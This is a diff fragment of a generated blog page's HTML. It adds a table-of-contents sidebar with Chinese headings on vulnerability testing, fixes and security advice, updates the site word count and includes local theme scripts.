class="nav-item nav-level-3"><a class="nav-link" href="#漏洞测试"><span class="nav-number">2.3.2.</span> <span class="nav-text">漏洞测试:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方法-1"><span class="nav-number">2.4.</span> <span class="nav-text">修复方法:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全建议"><span class="nav-number">2.4.1.</span> <span class="nav-text">安全建议:</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -627,7 +863,7 @@ show_date_time();
 <div class="theme-info">
   <div class="powered-by"></div>
 -->
-  <span class="post-count">博客全站共41.9k字</span>
+  <span class="post-count">博客全站共43.6k字</span>
 </div>
 
         
@@ -735,6 +971,10 @@ show_date_time();
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
